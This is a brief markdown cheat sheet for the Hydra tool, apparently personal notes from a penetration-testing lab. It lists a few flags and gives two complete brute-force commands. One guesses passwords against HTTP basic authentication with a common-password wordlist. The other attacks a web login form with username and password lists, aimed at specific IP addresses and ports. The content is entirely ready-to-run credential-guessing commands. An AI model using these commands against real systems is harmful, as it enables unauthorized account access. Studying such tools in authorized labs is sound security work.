# Hydra
- -t 4: numbers of task
- -f: fast mode
- -s 2222: specify port
## Exploiting Basic Auth 
```bash
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 83.136.249.223 -s 34409 http-get /
```
## Login Forms
```bash
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.49.128 -s 50553 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```
